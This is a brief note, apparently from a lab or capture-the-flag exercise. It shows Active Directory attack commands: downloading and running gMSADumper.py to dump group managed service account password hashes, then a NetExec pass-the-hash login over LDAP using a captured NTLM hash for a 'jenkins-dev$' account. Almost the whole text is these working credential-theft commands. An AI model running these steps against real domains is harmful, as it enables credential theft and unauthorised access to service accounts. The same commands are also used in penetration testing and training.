### Utilize [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper):
```shell
wget https://github.com/micahvandeusen/gMSADumper/raw/refs/heads/main/gMSADumper.py
python3 gMSADumper.py -d domain.local -l <TARGET-IP> -u <USER> -p <PASSWORD>
```
![[Pasted image 20251229191306.png]]
##### use `NetExec` to validate the credentials
```shell
netexec ldap 10.129.139.3 -u jenkins-dev$ -H 14a45cca9fd6ef26c7f2140bb5a8be98
```
